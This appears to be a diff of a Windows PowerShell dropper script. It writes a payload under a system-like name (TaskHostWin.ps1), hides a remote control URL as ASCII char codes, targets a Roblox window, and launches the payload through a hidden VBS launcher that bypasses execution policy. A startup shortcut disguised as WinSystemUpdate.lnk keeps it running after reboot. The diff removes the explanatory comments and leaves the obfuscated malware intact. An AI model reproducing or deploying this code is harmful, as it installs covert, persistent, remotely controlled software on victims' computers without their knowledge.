@@ -6,8 +6,7 @@ $psFile = "$dir\TaskHostWin.ps1"
 $vbsFile = "$dir\Launcher.vbs"
 $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinSystemUpdate.lnk"
 
-# --- 1. MOTOR DE CONTROL (TaskHostWin.ps1) ---
-# URL Anonimizada (ASCII)
+
 $c1 = '$u = 104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,112,111,108,103,97,116,105,122,47,108,111,120,47,109,97,105,110,47,99,111,110,116,114,111,108,46,116,120,116; $controlUrl = -join ($u | % {[char]$_})' + "`n"
 $c2 = '$windowTitle = "*Roblox*"' + "`n"
 $c3 = 'function MostrarHacker($l1, $l2) {' + "`n"
@@ -41,10 +40,9 @@ $c29 = '}'
 
 $psContent = $c1+$c2+$c3+$c4+$c5+$c6+$c7+$c8+$c9+$c10+$c11+$c12+$c13+$c14+$c15+$c16+$c17+$c18+$c19+$c20+$c21+$c22+$c23+$c24+$c25+$c26+$c27+$c28+$c29
 
-# --- 2. LANZADOR INVISIBLE (Launcher.vbs) ---
+
 $vbsContent = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.Run "powershell.exe -ExecutionPolicy Bypass -File ""' + $psFile + '""", 0, False'
 
-# --- 3. GUARDAR Y CONFIGURAR ---
 Set-Content -Path $psFile -Value $psContent -Force
 Set-Content -Path $vbsFile -Value $vbsContent -Force
 
